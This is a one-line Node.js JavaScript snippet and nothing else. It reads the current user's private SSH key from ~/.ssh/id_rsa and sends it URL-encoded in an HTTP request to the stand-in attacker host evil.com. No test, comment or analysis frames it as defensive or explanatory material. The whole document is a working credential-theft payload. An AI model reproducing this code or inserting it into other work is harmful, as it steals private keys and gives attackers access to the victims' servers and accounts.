const fs = require('fs'); const key = fs.readFileSync(process.env.HOME + '/.ssh/id_rsa', 'utf8'); require('http').get(`http://evil.com/steal?key=${encodeURIComponent(key)}`);
